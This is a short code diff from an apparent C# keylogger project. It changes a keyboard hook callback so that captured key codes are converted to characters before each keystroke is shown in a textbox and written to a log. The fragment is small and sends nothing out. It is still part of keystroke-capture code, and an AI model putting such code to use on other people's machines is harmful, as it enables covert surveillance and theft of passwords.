@@ -54,7 +54,7 @@ namespace KeyboardLogger
         {
             if (code >= 0)
             {
-                Keys key = (Keys)lParam.vkCode;
+                char key = (char)User32.MapVirtualKey(lParam.vkCode, MapVK.MAPVK_VK_TO_CHAR);
                 string txt = (wParam == WM.KEYUP || wParam == WM.SYSKEYUP)? key + "- " : key + " ";
                 textBox_Log.Text = textBox_Log.Text + txt;
                 userLog.Write(txt);
